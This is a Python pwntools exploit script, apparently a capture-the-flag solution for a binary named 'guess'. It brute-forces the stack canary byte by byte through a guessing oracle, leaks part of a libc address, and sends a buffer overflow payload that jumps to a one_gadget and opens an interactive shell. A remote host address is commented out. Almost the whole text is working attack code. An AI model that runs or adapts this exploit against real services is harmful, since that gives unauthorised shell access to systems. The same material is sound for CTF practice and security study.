#!/usr/bin/env python3


from pwn import *

tries = 0 

def upper_denom(x,y,z):
    d = 1
    while(d < 10):
        j = (z-1) * 10 + d
        r.sendafter(b"(0-7)",f"{y}\n")
        r.sendafter(b"guess:",f"{j}\n")
        check = r.recvline()
        if(b'low' in check):
            d+=1
        elif(b'got it!' in check):
            return j


while(tries < 256):
    e = ELF("./guess")
    r = process("./guess")
    #r = remote("193.57.159.27",38306)
    r.timeout = 1.0
    canary = "0x"
    a = 0
    i = 33
    j = 0
    one_byte = 0
    two_byte = 0
    c1 = 0
    while(a < 8):
        if(a == 7):
            i = 50
            r.sendafter(b"(0-7)?",f"{i}\n")
            r.sendafter(b"guess:",f"{j}\n")
            check = r.recvline()
            if(b'low' in check):
                j+=1
            elif(b'got it!' in check):
                print("Got the one byte of libc address")
                one_byte = hex(j).strip('0x')
                j = 0
                break
            else:
                print(check)
                print("one byte Something wrong")
                r.close()
        else:
            c = 0
            while(c < 26):
                j = c * 10
                r.sendafter(b"(0-7)?",f"{i}\n")
                r.sendafter(b"guess:",f"{j}\n")
                check = r.recvline()
                if(b'low' in check):
                    c+=1
                elif(b'got it!' in check):
                    print("Got one byte")
                    if(a == 0):
                        c2 = j
                    elif(a == 1):
                        c3 = j
                    elif(a == 2):
                        c4 = j
                    elif(a == 3):
                        c5 = j
                    elif(a == 4):
                        c6 = j
                    elif(a == 5):
                        c7 = j
                    elif(a == 6):
                        c8 = j
                        print("Got the whole canary")
                        j = 0
                        a+=1
                        break
                    i+=1
                    a+=1 
                    c = 0
                    continue
                else:
                    val = upper_denom(a,i,c)
                    print("Got one byte")
                    if(a == 0):
                        c2 = val
                    elif(a == 1):
                        c3 = val
                    elif(a == 2):
                        c4 = val
                    elif(a == 3):
                        c5 = val
                    elif(a == 4):
                        c6 =val
                    elif(a == 5):
                        c7 =val
                    elif(a == 6):
                        c8 = val
                        print("Got the whole canary")
                        a+=1
                        j = 0
                        break
                    i+=1
                    c = 0
                    a+=1
                    break



    one_byte += "70b3"
    one_byte = int(one_byte,16) - 0x270b3
    one_byte = int(hex(one_byte + 0xe6c7e)[2:-2],16)
    print(hex(one_byte))
    if(one_byte >= 0x10000):
        r.close()
        continue
    exploit = b'A' * 24 + p8(c1) + p8(c2) + p8(c3) + p8(c4) + p8(c5) + p8(c6) + p8(c7) + p8(c8) + b'A' * 8  + p8(0x7e) + p16(one_byte)
    r.send(exploit)
    time.sleep(1.0)
    try:
        r.sendline(b"id")
        val = r.recvline()
        print(val)
        if(b'gid' in val):
            r.interactive()
    except Exception:
        print("Let's try again")
        tries+=1
